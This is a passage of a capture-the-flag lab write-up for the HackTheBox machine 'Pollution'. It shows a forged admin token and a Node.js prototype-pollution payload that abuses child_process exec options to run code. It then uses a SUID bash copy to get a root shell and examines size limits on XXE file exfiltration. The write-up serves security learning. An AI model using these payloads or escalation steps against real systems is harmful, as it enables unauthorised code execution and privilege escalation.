+<span class="go">{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMHhkZiIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4ODA2NDc1MywiZXhwIjoxNjg4MDY4MzUzfQ.jUzPbs0K9Egl-J8ZBJ48J1w6G4bf07WleOGfPlK57lg"}}
+</span></code></pre></div></div>
+<p>And this token shows “admin”:</p>
+<picture>
+<source srcset="/img/image-20230629145313135.webp" type="image/webp"/>
+<img alt="image-20230629145313135" class="include_image" loading="lazy" src="/img/image-20230629145313135.png"/>
+</picture>
+<h3 id="rce-via-prototype-pollution">RCE via Prototype Pollution</h3>
+<h4 id="background-2">Background</h4>
+<p>The idea in a prototype pollution attack is to attack the prototype for objects. When you create a new object, it inherits from the prototype, but also carries a reference to that prototype along with it as <code class="language-plaintext highlighter-rouge">.__proto__</code>. I abused this in <a href="/hackvent2022/medium#hv2213">2022 Hackvent Day 13</a> to give my user admin access.</p>
+<p>We have this <code class="language-plaintext highlighter-rouge">messages</code> object, which is of type <code class="language-plaintext highlighter-rouge">object</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">user_sent</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span>
+    <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Message for admins</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>I can verify this in a browser console:</p>
+<picture>
+<source srcset="/img/image-20230629153908762.webp" type="image/webp"/>
+<img alt="image-20230629153908762" class="include_image" loading="lazy" src="/img/image-20230629153908762.png"/>
+</picture>
+<p>When it calls <code class="language-plaintext highlighter-rouge">merge(message, req.body)</code>, if done unsafely, I can structure <code class="language-plaintext highlighter-rouge">req.body</code> such that it overwrites parts of <code class="language-plaintext highlighter-rouge">message.__proto__</code>, which will be the prototype definition for <code class="language-plaintext highlighter-rouge">object</code>.</p>
+<p>Then when <code class="language-plaintext highlighter-rouge">exec</code> is called, part of what is needed is the <code class="language-plaintext highlighter-rouge">options</code> object, which is of the type <code class="language-plaintext highlighter-rouge">object</code> according to <a href="https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback">the docs</a>:</p>
+<picture>
+<source srcset="/img/image-20230629154321644.webp" type="image/webp"/>
+<img alt="image-20230629154321644" class="include_image" loading="lazy" src="/img/image-20230629154321644.png"/>
+</picture>
+<p>So if I can pollute the <code class="language-plaintext highlighter-rouge">object</code> prototype to have a <code class="language-plaintext highlighter-rouge">shell</code> value of something else, then <code class="language-plaintext highlighter-rouge">exec</code> will run that.</p>
+<p>One way to do this is to write a different executable to disk on Pollution and overwrite <code class="language-plaintext highlighter-rouge">shell</code> with the full path to that. Hacktricks offers a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-vuln-child_process-functions">payload</a> is a bit slicker, as it will use the <code class="language-plaintext highlighter-rouge">argv0</code> value in the prototype as well to somehow run arbitrary Node (in ways I don’t 100% understand, but does work).</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/proc/self/exe</span><span class="dl">"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//</span><span class="dl">"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">--require /proc/self/cmdline</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">something</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+<h4 id="execute">Execute</h4>
+<p>I’ll go into Burp repeater and make a request to <code class="language-plaintext highlighter-rouge">localhost:3000</code> and build it up to interact with the API. My payload will look like this:</p>
+<picture>
+<source srcset="/img/image-20230629160125840.webp" type="image/webp"/>
+<img alt="image-20230629160125840" class="include_image" loading="lazy" src="/img/image-20230629160125840.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">text</code> is just the requested parameter. Then I’m also updating the prototype with the variables from the HackTricks post. I’ve modified the <code class="language-plaintext highlighter-rouge">argv0</code> parameter to copy <code class="language-plaintext highlighter-rouge">bash</code> into <code class="language-plaintext highlighter-rouge">/tmp</code> and make it SetUID/SetGID for root.</p>
+<p>When I send this, I reports “Ok”. And the file is there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ls</span> /tmp/0xdf 
+<span class="go">1208 -rwsrwsrwx 1 root root 1234376 Jun 29 15:59 /tmp/0xdf
+</span></code></pre></div></div>
+<p>I’ll run it (with <code class="language-plaintext highlighter-rouge">-p</code> to avoid dropping privs) and get a shell as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="go">0xdf-5.1# id
+uid=1002(victor) gid=1002(victor) euid=0(root) egid=0(root) groups=0(root),1002(victor)
+</span></code></pre></div></div>
+<p>I’ll grab the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.1#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">01175b14************************
+</span></code></pre></div></div>
+<h2 id="beyond-root---max-url-length">Beyond Root - Max URL Length</h2>
+<p>I was curious to play around with the maximum return on files over the XXE vulnerability. The <code class="language-plaintext highlighter-rouge">passwd</code> file is bigger than the Apache configs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@pollution:~#</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-c</span> /etc/passwd /etc/hostname /etc/apache2/sites-enabled/<span class="k">*</span>
+<span class="go">2394 /etc/passwd
+  10 /etc/hostname
+1366 /etc/apache2/sites-enabled/collect.htb.conf
+2218 /etc/apache2/sites-enabled/developers.collect.htb.conf
+1364 /etc/apache2/sites-enabled/forum.collect.htb.conf
+</span></code></pre></div></div>
+<p>I am curious to find out the line between 2394 and 2218. I’ll add some lines of junk to the bottom of the <code class="language-plaintext highlighter-rouge">developers.collect.htb.conf</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@pollution:~#</span><span class="w"> </span><span class="nb">tail</span> <span class="nt">-15</span> /etc/apache2/sites-enabled/developers.collect.htb.conf
+<span class="gp">        #</span><span class="w"> </span>include a line <span class="k">for </span>only one particular virtual host. For example the
+<span class="gp">        #</span><span class="w"> </span>following line enables the CGI configuration <span class="k">for </span>this host only
+<span class="gp">        #</span><span class="w"> </span>after it has been globally disabled with <span class="s2">"a2disconf"</span><span class="nb">.</span>
+<span class="gp">        #</span>Include conf-available/serve-cgi-bin.conf
+<span class="go">&lt;/VirtualHost&gt;
+
+</span><span class="gp">#</span><span class="w"> </span>vim: <span class="nv">syntax</span><span class="o">=</span>apache <span class="nv">ts</span><span class="o">=</span>4 <span class="nv">sw</span><span class="o">=</span>4 <span class="nv">sts</span><span class="o">=</span>4 sr noet
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp">#</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</code></pre></div></div>
+<p>Some experimenting shows that when the file is 2218 bytes it does not work, but 2217 bytes does. Now it’s not the raw file coming back as I am exfiling it, but the base64 encoded version, which will be roughly 4/3 the size. 2995 works, but 2999 fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@pollution:~#</span><span class="w"> </span><span class="nb">base64</span> /etc/apache2/sites-enabled/developers.collect.htb.conf | <span class="nb">wc</span> <span class="nt">-c</span>
+<span class="go">2995
+</span><span class="gp">root@pollution:~#</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"a"</span> <span class="o">&gt;&gt;</span> /etc/apache2/sites-enabled/developers.collect.htb.conf
+<span class="gp">root@pollution:~#</span><span class="w"> </span><span class="nb">base64</span> /etc/apache2/sites-enabled/developers.collect.htb.conf | <span class="nb">wc</span> <span class="nt">-c</span>
+<span class="go">2999
+</span></code></pre></div></div>
+<p>It’s not super important what the exact limit is. I suspect PHP is limited at 3000 and counting perhaps the <code class="language-plaintext highlighter-rouge">GET</code> as part of it. The important part is to know this could happen, and plan around it.</p>
+<p>One thing I could do also is use a deflate filter before base64-encoding, which would compress the text and give me much more exfil. On the other hand, then it would be more of a pain to decode.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/07/01/htb-pollution.html"></a>
+</article>
